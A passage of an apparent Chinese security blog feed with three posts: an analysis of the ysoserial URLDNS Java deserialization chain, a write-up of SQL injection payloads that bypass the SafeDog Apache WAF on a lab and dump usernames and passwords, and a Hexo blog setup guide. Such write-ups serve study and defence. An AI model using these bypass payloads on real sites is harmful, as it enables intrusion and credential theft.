alt="image.png"></p><p>发现会调用getHostAddress这个方法，继续跟进</p><p><img src="/assets/image-20230423194007-gqmzmcp.png" alt="image.png"></p><p>发现调用getByName方法，也就是这个函数发送了dns请求</p><p><img src="/assets/image-20230423194431-aqa3qp4.png" alt="image.png"></p><p>搞明白了为什么会发生dns请求之后呢，再来分析分析URLDNS这条链</p><h1 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h1><p>先看看ysoserial生成的payload代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它new了一个SilentURLStreamHandler</p><p><img src="/assets/image-20230423200918-sluvcrh.png" alt="image.png"></p><p>而SilentURLStreamHandler继承了URLStreamHandler然后重写了如下两个方法</p><p><img src="/assets/image-20230423201020-d8tdik4.png" alt="image.png"></p><p>还记得我们在分析使用put方法是会触发dns请求让留意了一下handler</p><p><img src="/assets/image-20230423205459-izhitm6.png" alt="image.png"></p><p>前面说了handler是URLStreamHandler的一个实例，重写了URLStreamHandler里的openConnection方法和getHostAddress方法目的就是为了防止在生成payload的时候触发了dns请求。</p><p>至此为止，我们所有分析的代码都没有涉及到反序列化，那么利用反序列化去构造这条链呢。上面分析了那么久HashMap的put方法触发dns请求，那么今天的主角毋庸置疑也是HashMap这个类，反序列化会触发readObject方法，那么直接进入到HashMap的readObject方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该方法的最后一行，见到了熟悉的一行代码</p><p><img src="/assets/image-20230423224902-tqq44xw.png" alt="image.png"></p><p>那么这条链不就跑通了吗，最后我们以漏洞利用的方式来重新捋一捋</p><p>首先我们利用ysoserial生成一个URLDNS的payload</p><p><img src="/assets/image-20230423225338-rzgeb9y.png" alt="image.png"></p><p>然后创建一个反序列化入口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        unserialize(<span class="string">&quot;dnstest.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassCastException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在HashMap类的readObject方法如下代码处打上一个断点</p><p><img src="/assets/image-20230423225557-dma25kz.png" alt="image.png"></p><p>然后进行调试，程序成功走到我们的断点处</p><p><img src="/assets/image-20230423225749-t3v79t6.png" alt="image.png"></p><p>跟进hash方法</p><p><img src="/assets/image-20230423225906-eb313o1.png" alt="image.png"></p><p>跟进key.hashCode</p><p><img src="/assets/image-20230423225937-t6can6f.png" alt="image.png"></p><p>跟进handler.hashCode</p><p><img src="/assets/image-20230423230025-7rxqf8d.png" alt="image.png"></p><p>跟进getHostAddress</p><p><img src="/assets/image-20230423230146-a347lep.png" alt="image.png"></p><p>成功执行到getByName函数触发dns请求</p><p><img src="/assets/image-20230423230242-vindcag.png" alt="image.png"></p><h1 id="利用链挖掘角度分析URLDNS链"><a href="#利用链挖掘角度分析URLDNS链" class="headerlink" title="利用链挖掘角度分析URLDNS链"></a>利用链挖掘角度分析URLDNS链</h1><p>如上的分析都是我们以一个漏洞分析者去正向的分析这条链子，那么以漏洞挖掘者的身份我们就要倒过来看这条链了，首先我们从getByName这个函数开始，这个函数可以触发dns请求，那么我们看看谁调用了这个函数，我么可以点击这个函数，然后用Ctrl+Alt+H来查看这个函数的调用关系</p><p><img src="/assets/image-20230424110243-jycoilw.png" alt="image.png"></p><p>然后就是逐步去看这些函数，是否能构造反序列化链，构造需要我们要注意三个事情</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、参数可控</span><br><span class="line"><span class="number">2</span>、类可反序列化，继承了序列化接口</span><br><span class="line"><span class="number">3</span>、最终走到反序列化触发的readObject</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230424111832-0ps308e.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站安全狗APACHE版V4.0绕过</title>
      <link href="/2023/04/29/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E7%8B%97APACHE%E7%89%88V4-0%E7%BB%95%E8%BF%87/"/>
      <url>/2023/04/29/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E7%8B%97APACHE%E7%89%88V4-0%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在记忆里上次绕安全狗还是在上次，开开心心把自己之前绕过狗的payload拿出来，发现全部被拦截了，事情一下子就严肃起来了，这就开整。<img src="/assets/image-20220210101102-k2p13gt.png" alt="image.png"></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本次环境如下sqli-lab的sql注入靶场</span><br><span class="line">网站安全狗APACHE版V4.0版本的最高防护等级</span><br></pre></td></tr></table></figure><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p>首先先来分析分析以前以前绕过的Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union/*!10440*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p>其中这里的10440数字经过fuzz可以替换的有如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10440–10449 13440-13449 14400-14499 15440-15449 16440-16449 17440-17449 18440-18449 等等</span><br></pre></td></tr></table></figure><p>但是在更新后的安全狗后这些payload已经全部被拦截</p><p><img src="/assets/image-20220210112947-p973ryj.png" alt="image.png"></p><p>到这就不得不提提安全狗之前的匹配规则了，我们单独union不会被拦截</p><p><img src="/assets/image-20220210102704-nrcpsi2.png" alt="image.png"></p><p>单独select也不会被拦截</p><p><img src="/assets/image-20220210102744-tm2k93h.png" alt="image.png"></p><p>但是union和select放一起组合就会被匹配出来，然后被安全狗所拦截</p><p><img src="/assets/image-20220210102844-j4t2eo1.png" alt="image.png"></p><p>基于这个特性，我们利用之前的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union/*!10440*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p>是可以绕过老版本的安全狗的，这里在union和select中间加入了一个&#x2F;*!10440*&#x2F;，众所周知在mysql中&#x2F;*!…*&#x2F;不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在&#x2F;*!…*&#x2F;中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。</p><p>所以union&#x2F;*!10440*&#x2F;select等价于union select,且绕过了安全狗对union和select字符一起组合的检测</p><p><img src="/assets/image-20220210113247-o80q334.png" alt="image.png"></p><p><img src="/assets/image-20220210113309-8ovvx1n.png" alt="image.png"></p><p>但是安全狗更新之后，所有的payload都已经失效，那么我们猜测一下，安全狗更新后是不是匹配union和select之间所有的字符，匹配到之后用空字符替换，再检测是否存在union select组合，为了验证这个猜测我们对我们的payload进行fuzz验证一下</p><p>跑了一些特殊的字符发现都被拦截<img src="/assets/image-20220210104653-4fuct55.png" alt="image.png"></p><p>但是唯独有一个符号没有被返回的length长度不一样</p><p><img src="/assets/image-20220210105306-j317gqe.png" alt="image.png"></p><p>按我们看看这个’#’会擦出什么爱情的火花</p><p>我们利用如下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union/*!test01#test02*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210105529-1seiqqq.png" alt="image.png"></p><p>此处我们搞清楚一个流程，我们的语句发送过去，首先接收安全狗检测，安全狗检测到’#’号，所以’#‘后面的都会被截断抛弃，所以安全狗只能匹配到’#‘前的union，但是没匹配到’#‘后的select，所以通过安全狗。在通过安全狗后我们的语句被数据库接收，数据库此处处理过程和安全狗处理流程一样，都是只能匹配到’#‘前的union，但是没匹配到’#‘后的select，最终导致语句不完整导致最后的报错。</p><p>说到这里我们究竟要怎么去绕过这个可恶的安全狗呢，我们想象这么一个场景，首先我们的’#‘被安全狗识别，但是在我们的SQL语句中并不识别这个’#‘，这样我们就可以达到绕过安全狗而且保持正确的SQL语句来实现我么的注入。</p><p>我们来看下下面两语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM number WHERE home_id =1 LIKE &quot;[%23]&quot;;</span><br><span class="line">SELECT * FROM number WHERE home_id =1 LIKE &quot;[%23]&quot; union select * FROM number;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210111606-4sc540e.png" alt="image.png"></p><p><img src="/assets/image-20220210111634-q48r6c9.png" alt="image.png"></p><p>此处SELECT * FROM number WHERE home_id &#x3D;1 LIKE “[%23]”;查出来一个空表</p><p>所以SELECT * FROM number WHERE home_id &#x3D;1 LIKE “[%23]” union select * FROM number;相当于select * FROM number；</p><p>该语句是存在一个LIKE “[%23]”，也正是这个LIKE “[%23]”让我们的SELECT * FROM number WHERE home_id &#x3D;1成为一个空表。</p><p><img src="/assets/image-20220210111930-hwjeqmo.png" alt="image.png"></p><p><img src="/assets/image-20220210112007-qm4enya.png" alt="image.png"></p><p>那么这个语句有什么用的，可以发现我们的LIKE “[%23]”中有一个%23，众所周知#的url编码是%23，那么这条语句带入到安全狗中，安全狗会不会识别这个#呢，带着这样的猜想我们构造如下payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union select*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210113656-jmvg52w.png" alt="image.png"></p><p>呜呜呜，还是被拦截了，吹牛逼吹了这么久，白吹了。</p><p>但是我这种阳光、帅气、善解人意且坚持不懈的小伙子会这么容易就放弃吗，显然不会，后面猜测是&#x2F;*!10440union select*&#x2F;中的union select被检测出来了，所以在union select中间下了点功夫，最终payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210114600-drzjavp.png" alt="image.png"></p><p>奈何无文化，一句卧槽走天下。</p><p>最后总结下安全狗的检测机制</p><p>首先整体语句做一个检测，这个检测也是最强最牛X的</p><p>‘#‘后的语句虽然被截断，但截断之后并不是和我们最初想的那样完全不检测，’#‘截断的语句还是会被检测，只是检测规则相比第一次不同且相比第一次检测强度相比较弱，所以我们可以对其进行绕过。</p><p>当然除了like关键字，我们还可以使用如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; and &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; or &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; regexp &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; /*%23*/ /*!10440union%0aselect*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p>知道了这个特性接下来就，那就用这一招打过天下无敌手</p><p>爆数据库名和用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),user(/*!10440%0a*/)--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210150144-zx3u2iv.png" alt="image.png"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(table_name) from/*%23*/information_schema.tables where table_schema=database(/*!10440%0a*/)--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211094933-cz39a4b.png" alt="image.png"></p><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(column_name) from/*%23*/information_schema.columns where table_schema=database(/*!10440%0a*/) /*!10440and*/ table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211101324-3d9lcrx.png" alt="image.png"></p><p>爆字段中的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(username,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211101528-yxoqchw.png" alt="image.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1、内联yyds</p><p>2、在一些被拦截的地方多用&#x2F;*%23*&#x2F;和&#x2F;*!<em>10440%0a</em>*&#x2F;，有奇效。</p>]]></content>
      
      
      <categories>
          
          <category> Waf绕过小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> Waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/2023/04/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/04/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="仓库准备"><a href="#仓库准备" class="headerlink" title="仓库准备"></a>仓库准备</h1><p>创建一个github仓库</p><p><img src="/assets/image-20230428113657-foci2pj.png" alt="image.png"></p><p>名字格式如下</p><p><img src="/assets/image-20230428143514-5re00dt.png" alt="image.png"></p><p>创建完成</p><p><img src="/assets/image-20230428143531-7pssyed.png" alt="image.png"></p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>可百度自行寻找安装方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装npm</span><br><span class="line">安装git</span><br></pre></td></tr></table></figure><p>安装完成后确保能使用如下命令</p><p><img src="/assets/image-20230428114119-smyr1cd.png" alt="image.png"></p><p><img src="/assets/image-20230428114134-7i475dw.png" alt="image.png"></p><h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><p>创建一个目录，名字任意，然后打开git bash</p><p><img src="/assets/image-20230428114242-4sciiw9.png" alt="image.png"></p><p>使用git init初始化目录</p><p><img src="/assets/image-20230428114340-l6u5g0u.png" alt="image.png"></p><p>在git根目录下创建一个Blog目录，打开cmd窗口用如下命令安装hexo-cli</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>然后在Blog目录下使用如下命令完成hexo初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428114827-anozuyy.png" alt="image.png"></p><p>初始化后的文件结构</p><p><img src="/assets/image-20230428114845-kg8ru0e.png" alt="image.png"></p><p>使用如下命令启动博客</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428115010-qsc09n5.png" alt="image.png"></p><p>本地访问</p><p><img src="/assets/image-20230428115023-d7gxtc1.png" alt="image.png"></p><h1 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h1><p>Hexo默认的主体比较简约，屏幕使用占比不是很高，用户可以根据自己的喜好自定义Hexo主体，这里以butterfly主题为例</p><p>在Hexo的根目录执行如下命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https:<span class="comment">//github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428133950-mcf3uwk.png" alt="image.png"></p><p>在&#x2F;Blog&#x2F;themes下会克隆一个文件夹下来</p><p><img src="/assets/image-20230428134131-7qkc7yq.png" alt="image.png"></p><p>然后在Hexo的根目录下修改_config.yml文件里的theme为butterfly</p><p><img src="/assets/image-20230428134342-4oab1oq.png" alt="image.png"></p><p>修改后在安装一下 pug 和 stylus 的渲染器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428134521-73agchw.png" alt="image.png"></p><p>重新启动查看效果</p><p><img src="/assets/image-20230428134620-sc08gi3.png" alt="image.png"></p><h1 id="上传Github"><a href="#上传Github" class="headerlink" title="上传Github"></a>上传Github</h1><p>本地搭建没有问题之后，就可以把博客部署到Github仓库里去了</p><p>复制我们之前创建好的仓库的地址</p><p><img src="/assets/image-20230428143709-6100690.png" alt="image.png"></p><p>然后在Hexo的根目录下的_config.yml进行如下配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  repository: https:<span class="comment">//github.com/suifeng-kali/suifeng-kali.github.io.git</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428143638-vwbi1d9.png" alt="image.png"></p><p>配置好后可以下载一个deploy-git，利用deploy-git简化部署步骤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428140134-k25rrrp.png" alt="image.png"></p><p>然后使用如下命令进行部署</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p><img 